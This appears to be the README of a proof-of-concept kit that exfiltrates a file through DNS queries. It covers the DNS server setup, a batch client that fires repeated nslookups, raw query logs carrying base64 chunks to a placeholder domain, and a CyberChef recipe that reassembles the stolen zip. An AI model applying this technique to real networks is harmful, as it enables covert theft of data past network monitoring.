# DNS-Exfil-POC
This is a very rough, messy, semi-GPT generated Python "all-in-one" kit to demo some data exfiltration using nothing but DNS requests. Feel free to take whatever you want from this and do with as you please. 

Reference: https://hinty.io/devforth/dns-exfiltration-of-data-step-by-step-simple-guide/

# Server Setup:

1. Setup your DNS similar to the reference URL above
2. Grab this Python DNS server example: https://gist.github.com/pklaus/b5a7876d4d2cf7271873 (Credit: https://gist.github.com/pklaus)
3. Run the DNS server with the following command line: ``` python3 ddnsserver.py --port 53 --udp > dns_poc.txt ```

# Client Setup

1. Download the release or clone this repo
2. Edit the domain on line 49 to your doamin (you can leave the "payload" (file_path) as poc.zip to test with the included file
3. Launch "leak.bat" and a continuous NSLookup will spawn, when you hit the "pause" the script has finished sending data

# Review and Re-assemble Data

1. On the server cat "dns_poc.txt"
2. Select all "AAAA" request lines with: ``` cat dns_poc.txt | grep -E ';.*AAAA|AAAA.*;' | uniq ```
3. Example output:
```
;UEsDBBQAAAAIAKZoaVelbekKYQEAAAEC.sub.yourdomain.com IN      A
;UEsDBBQAAAAIAKZoaVelbekKYQEAAAEC.sub.yourdomain.com IN      AAAA
;UEsDBBQAAAAIAKZoaVelbekKYQEAAAEC.sub.yourdomain.com IN      A
;UEsDBBQAAAAIAKZoaVelbekKYQEAAAEC.sub.yourdomain.com IN      AAAA
;AAAHAAAAcG9jLmNzdkWQzW6DMBCE70i8.sub.yourdomain.com IN      A
;AAAHAAAAcG9jLmNzdkWQzW6DMBCE70i8.sub.yourdomain.com IN      AAAA
;gx9gt7IxYHOrBe6fEohC-nuzGktBBVMB.sub.yourdomain.com IN      AAAA
;qdS3r-Om6cHSjHf0ecc33TQvtRksrMxZ.sub.yourdomain.com IN      AAAA
;6MF0PWwOo7Og9vvJzjOU3fIN7WIWC2_d.sub.yourdomain.com IN      AAAA
;ZznuLZTj0S2Tv23rOKrsV-dOgUNvvyE4.sub.yourdomain.com IN      AAAA
;PLvrz_H96n0cgFOOMpMoCiGBJZysTedI.sub.yourdomain.com IN      AAAA
;u_i4-7ITlBQkpSyFx1ZBxjIUEhOeJHG0.sub.yourdomain.com IN      AAAA
;MQs8dc7O4BUGdaEmVGAhBeZZyiHNcqL7.sub.yourdomain.com IN      AAAA
;4QR97tz-YAZYa6ApzZNA5YVAxjDnqYij.sub.yourdomain.com IN      AAAA
;BzOPDvSx928HjUFfyBlLMOPSH1qAkAVp.sub.yourdomain.com IN      AAAA
;zMeJrI7z4svuXkBwTlkApx5MC2Q0L-Lo.sub.yourdomain.com IN      AAAA
;trfO-VWnD08OBn_N_9IsRc5TZIWvyygj.sub.yourdomain.com IN      AAAA
;G98pfIXpezMHdkb_2NKHc5Sc5nEUR2q1.sub.yourdomain.com IN      AAAA
;IpXaKfKsWrJVddWsV6_kVtd6q3a6Irs7.sub.yourdomain.com IN      AAAA
;vdXkviV1E0dbrc5p_bJpWj--r33CTyu9.sub.yourdomain.com IN      AAAA
;bkjZPv0AUEsBAh8AFAAAAAgApmhpV6Vt.sub.yourdomain.com IN      A
;bkjZPv0AUEsBAh8AFAAAAAgApmhpV6Vt.sub.yourdomain.com IN      AAAA
;bkjZPv0AUEsBAh8AFAAAAAgApmhpV6Vt.sub.yourdomain.com IN      A
;bkjZPv0AUEsBAh8AFAAAAAgApmhpV6Vt.sub.yourdomain.com IN      AAAA
;6QphAQAAAQIAAAcAJAAAAAAAAAAgAAAA.sub.yourdomain.com IN      A
;6QphAQAAAQIAAAcAJAAAAAAAAAAgAAAA.sub.yourdomain.com IN      AAAA
;6QphAQAAAQIAAAcAJAAAAAAAAAAgAAAA.sub.yourdomain.com IN      A
;6QphAQAAAQIAAAcAJAAAAAAAAAAgAAAA.sub.yourdomain.com IN      AAAA
;AAAAAHBvYy5jc3YKACAAAAAAAAEAGAC7.sub.yourdomain.com IN      AAAA
;iFVJNxPaAbuIVUk3E9oBzHgqlywT2gFQ.sub.yourdomain.com IN      AAAA
;SwUGAAAAAAEAAQBZAAAAhgEAAAAA.sub.yourdomain.com IN      A
```
4. Filter results and extract unique "AAAA" record queries (you may need the last trailing "A" record query if there is no associated "AAAA" record with the same query)
 ```
;UEsDBBQAAAAIAKZoaVelbekKYQEAAAEC.sub.yourdomain.com IN      AAAA
;AAAHAAAAcG9jLmNzdkWQzW6DMBCE70i8.sub.yourdomain.com IN      AAAA
;gx9gt7IxYHOrBe6fEohC-nuzGktBBVMB.sub.yourdomain.com IN      AAAA
;qdS3r-Om6cHSjHf0ecc33TQvtRksrMxZ.sub.yourdomain.com IN      AAAA
;6MF0PWwOo7Og9vvJzjOU3fIN7WIWC2_d.sub.yourdomain.com IN      AAAA
;ZznuLZTj0S2Tv23rOKrsV-dOgUNvvyE4.sub.yourdomain.com IN      AAAA
;PLvrz_H96n0cgFOOMpMoCiGBJZysTedI.sub.yourdomain.com IN      AAAA
;u_i4-7ITlBQkpSyFx1ZBxjIUEhOeJHG0.sub.yourdomain.com IN      AAAA
;MQs8dc7O4BUGdaEmVGAhBeZZyiHNcqL7.sub.yourdomain.com IN      AAAA
;4QR97tz-YAZYa6ApzZNA5YVAxjDnqYij.sub.yourdomain.com IN      AAAA
;BzOPDvSx928HjUFfyBlLMOPSH1qAkAVp.sub.yourdomain.com IN      AAAA
;zMeJrI7z4svuXkBwTlkApx5MC2Q0L-Lo.sub.yourdomain.com IN      AAAA
;trfO-VWnD08OBn_N_9IsRc5TZIWvyygj.sub.yourdomain.com IN      AAAA
;G98pfIXpezMHdkb_2NKHc5Sc5nEUR2q1.sub.yourdomain.com IN      AAAA
;IpXaKfKsWrJVddWsV6_kVtd6q3a6Irs7.sub.yourdomain.com IN      AAAA
;vdXkviV1E0dbrc5p_bJpWj--r33CTyu9.sub.yourdomain.com IN      AAAA
;bkjZPv0AUEsBAh8AFAAAAAgApmhpV6Vt.sub.yourdomain.com IN      AAAA
;6QphAQAAAQIAAAcAJAAAAAAAAAAgAAAA.sub.yourdomain.com IN      AAAA
;AAAAAHBvYy5jc3YKACAAAAAAAAEAGAC7.sub.yourdomain.com IN      AAAA
;iFVJNxPaAbuIVUk3E9oBzHgqlywT2gFQ.sub.yourdomain.com IN      AAAA
;SwUGAAAAAAEAAQBZAAAAhgEAAAAA.sub.yourdomain.com IN      A
```
5. Parsing the results down further, we get the raw URL Safe Base64
```
UEsDBBQAAAAIAKZoaVelbekKYQEAAAEC
AAAHAAAAcG9jLmNzdkWQzW6DMBCE70i8
gx9gt7IxYHOrBe6fEohC-nuzGktBBVMB
qdS3r-Om6cHSjHf0ecc33TQvtRksrMxZ
6MF0PWwOo7Og9vvJzjOU3fIN7WIWC2_d
ZznuLZTj0S2Tv23rOKrsV-dOgUNvvyE4
PLvrz_H96n0cgFOOMpMoCiGBJZysTedI
u_i4-7ITlBQkpSyFx1ZBxjIUEhOeJHG0
MQs8dc7O4BUGdaEmVGAhBeZZyiHNcqL7
4QR97tz-YAZYa6ApzZNA5YVAxjDnqYij
BzOPDvSx928HjUFfyBlLMOPSH1qAkAVp
zMeJrI7z4svuXkBwTlkApx5MC2Q0L-Lo
trfO-VWnD08OBn_N_9IsRc5TZIWvyygj
G98pfIXpezMHdkb_2NKHc5Sc5nEUR2q1
IpXaKfKsWrJVddWsV6_kVtd6q3a6Irs7
vdXkviV1E0dbrc5p_bJpWj--r33CTyu9
bkjZPv0AUEsBAh8AFAAAAAgApmhpV6Vt
6QphAQAAAQIAAAcAJAAAAAAAAAAgAAAA
AAAAAHBvYy5jc3YKACAAAAAAAAEAGAC7
iFVJNxPaAbuIVUk3E9oBzHgqlywT2gFQ
SwUGAAAAAAEAAQBZAAAAhgEAAAAA
```
6. Feed that into CyberChef with the following recipe: From Base64 (URL Safe Alphabet, Remove Non-Alphabet Characters), Unzip:
```
https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9-_',true,false)Unzip('',false)&input=VUVzREJCUUFBQUFJQUtab2FWZWxiZWtLWVFFQUFBRUMNCkFBQUhBQUFBY0c5akxtTnpka1dRelc2RE1CQ0U3MGk4DQpneDlndDdJeFlIT3JCZTZmRW9oQy1udXpHa3RCQlZNQg0KcWRTM3ItT202Y0hTakhmMGVjYzMzVFF2dFJrc3JNeFoNCjZNRjBQV3dPbzdPZzl2dkp6ak9VM2ZJTjdXSVdDMl9kDQpaem51TFpUajBTMlR2MjNyT0tyc1YtZE9nVU52dnlFNA0KUEx2cnpfSDk2bjBjZ0ZPT01wTW9DaUdCSlp5c1RlZEkNCnVfaTQtN0lUbEJRa3BTeUZ4MVpCeGpJVUVoT2VKSEcwDQpNUXM4ZGM3TzRCVUdkYUVtVkdBaEJlWlp5aUhOY3FMNw0KNFFSOTd0ei1ZQVpZYTZBcHpaTkE1WVZBeGpEbnFZaWoNCkJ6T1BEdlN4OTI4SGpVRmZ5QmxMTU9QU0gxcUFrQVZwDQp6TWVKckk3ejRzdnVYa0J3VGxrQXB4NU1DMlEwTC1Mbw0KdHJmTy1WV25EMDhPQm5fTl85SXNSYzVUWklXdnl5Z2oNCkc5OHBmSVhwZXpNSGRrYl8yTktIYzVTYzVuRVVSMnExDQpJcFhhS2ZLc1dySlZkZFdzVjZfa1Z0ZDZxM2E2SXJzNw0KdmRYa3ZpVjFFMGRicmM1cF9iSnBXai0tcjMzQ1R5dTkNCmJralpQdjBBVUVzQkFoOEFGQUFBQUFnQXBtaHBWNlZ0DQo2UXBoQVFBQUFRSUFBQWNBSkFBQUFBQUFBQUFnQUFBQQ0KQUFBQUFIQnZZeTVqYzNZS0FDQUFBQUFBQUFFQUdBQzcNCmlGVkpOeFBhQWJ1SVZVazNFOW9CekhncWx5d1QyZ0ZRDQpTd1VHQUFBQUFBRUFBUUJaQUFBQWhnRUFBQUFB
```
7. Review the unzipped "poc.csv" file from within "poc.zip"
